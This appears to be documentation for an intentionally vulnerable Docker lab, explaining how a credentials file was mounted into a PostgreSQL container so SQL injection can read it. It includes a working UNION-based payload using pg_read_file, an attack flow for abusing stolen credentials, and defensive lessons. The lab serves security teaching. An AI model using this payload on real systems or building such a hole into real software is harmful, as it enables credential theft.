# 🔧 Container Architecture & File Access

## 🏗️ The Problem (Before Fix)

```
┌──────────────────────────────────────────────────────────────┐
│                        Docker Host                           │
│                                                              │
│  ┌─────────────────────┐      ┌──────────────────────────┐  │
│  │  typo-postgres      │      │  typo-payments           │  │
│  │  Container          │      │  Container               │  │
│  │                     │      │                          │  │
│  │  PostgreSQL runs    │      │  Flask app runs here    │  │
│  │  here               │      │                          │  │
│  │                     │      │  /app/                   │  │
│  │  Can execute:       │      │    ├── app.py            │  │
│  │  - pg_read_file()   │      │    ├── dbconf.ini ✓     │  │
│  │  - pg_ls_dir()      │      │    ├── templates/        │  │
│  │                     │      │    └── static/           │  │
│  │  ❌ CANNOT ACCESS   │      │                          │  │
│  │     /app/ directory │      │                          │  │
│  │                     │      │                          │  │
│  │  pg_read_file(      │─ ✗ ─▶│  '/app/dbconf.ini'      │  │
│  │    '/app/...')      │      │                          │  │
│  │  = ERROR            │      │                          │  │
│  └─────────────────────┘      └──────────────────────────┘  │
│                                                              │
└──────────────────────────────────────────────────────────────┘

ERROR: could not open file "/app/dbconf.ini" for reading: No such file or directory
```

---

## ✅ The Solution (After Fix)

```
┌──────────────────────────────────────────────────────────────┐
│                        Docker Host                           │
│                    ./dbconf.ini (source)                     │
│                           │                                  │
│                           ├─── Volume Mount ──┐              │
│                           │                   │              │
│  ┌─────────────────────┐ │   ┌───────────────▼──────────┐   │
│  │  typo-postgres      │ │   │  typo-payments           │   │
│  │  Container          │ │   │  Container               │   │
│  │                     │ │   │                          │   │
│  │  PostgreSQL runs    │ │   │  Flask app runs here    │   │
│  │  here               │ │   │                          │   │
│  │                     │ │   │  /app/                   │   │
│  │  /tmp/              │ │   │    ├── app.py            │   │
│  │    └── dbconf.ini ◀─┼─┘   │    ├── dbconf.ini ✓     │   │
│  │        (read-only)  │     │    ├── templates/        │   │
│  │                     │     │    └── static/           │   │
│  │  ✅ CAN ACCESS      │     │                          │   │
│  │     /tmp/dbconf.ini │     │                          │   │
│  │                     │     │                          │   │
│  │  pg_read_file(      │     │                          │   │
│  │    '/tmp/dbconf.ini'│     │                          │   │
│  │  ) = SUCCESS! ✓     │     │                          │   │
│  └─────────────────────┘     └──────────────────────────┘   │
│                                                              │
└──────────────────────────────────────────────────────────────┘

✓ File readable from PostgreSQL container!
✓ SQL injection can extract credentials!
✓ Demonstrates real-world container file sharing!
```

---

## 📋 Technical Details

### Volume Mount Configuration

**docker-compose.yml:**
```yaml
services:
  postgres:
    volumes:
      - ./dbconf.ini:/tmp/dbconf.ini:ro
      #     ↑              ↑           ↑
      #     |              |           └── Read-only (security)
      #     |              └── Container path (accessible by PostgreSQL)
      #     └── Host path (your local file)
```

### File Permissions

```bash
# Inside typo-postgres container:
$ ls -la /tmp/dbconf.ini
-rw-r--r-- 1 root root 1757 Nov 25 05:54 /tmp/dbconf.ini
                                           ↑
                                           Readable by all users ✓
```

---

## 🎯 Attack Flow

```
1. Attacker finds SQL injection
   └─▶ /status?id=<payload>

2. Attacker enumerates directories
   └─▶ pg_ls_dir('/tmp')
   └─▶ Discovers: dbconf.ini

3. Attacker reads config file
   └─▶ pg_read_file('/tmp/dbconf.ini')
   └─▶ Gets: All credentials!

4. Attacker uses stolen credentials
   ├─▶ Connect to production database
   ├─▶ Use Stripe API to process payments
   ├─▶ Access AWS account (spin up mining instances)
   ├─▶ Send phishing emails via SendGrid
   └─▶ Complete system compromise! 💥
```

---

## 🧪 Verification Commands

### Check file exists in PostgreSQL container:
```bash
docker compose exec postgres ls -la /tmp/dbconf.ini
```

### Test reading from PostgreSQL:
```bash
docker compose exec postgres psql -U typo_admin -d typo_payments \
  -c "SELECT pg_read_file('/tmp/dbconf.ini');"
```

### Test via SQL injection:
```
http://localhost:5000/status?id=1 UNION SELECT 1, 2, 'creds', 0.00, pg_read_file('/tmp/dbconf.ini'), 'JACKPOT', CURRENT_TIMESTAMP
```

---

## 📖 Key Concepts

### Container Isolation
- Each container has **separate filesystem**
- Containers cannot see each other's files by default
- **Volumes** enable file sharing between host ↔ container

### Security Implications
- Even with container isolation, SQL injection + file reading = dangerous
- Attackers need to **enumerate** accessible paths
- Shows why **principle of least privilege** matters (DB shouldn't read files!)

### Real-World Lesson
- **Never store secrets in files** that database can read
- Use **environment variables** or **secrets managers**
- Implement **proper database permissions** (no pg_read_file!)
- **Parameterize queries** to prevent SQL injection

---

## 🎓 Educational Scenarios

### Scenario 1: Developer Mistake
"The config file is inside Docker, so it's safe!"
**Reality**: SQL injection can read it! ❌

### Scenario 2: Insufficient Permissions
"We use containers for security!"
**Reality**: Container isolation ≠ SQL injection protection ❌

### Scenario 3: Defense in Depth Missing
"One security control is enough"
**Reality**: Need multiple layers (no SQLi + no file read + encrypted secrets) ✓

---

**Architecture**: Multi-container Docker setup  
**Vulnerability**: SQL injection + pg_read_file()  
**File Path**: `/tmp/dbconf.ini`  
**Impact**: Complete credential exposure 🔥
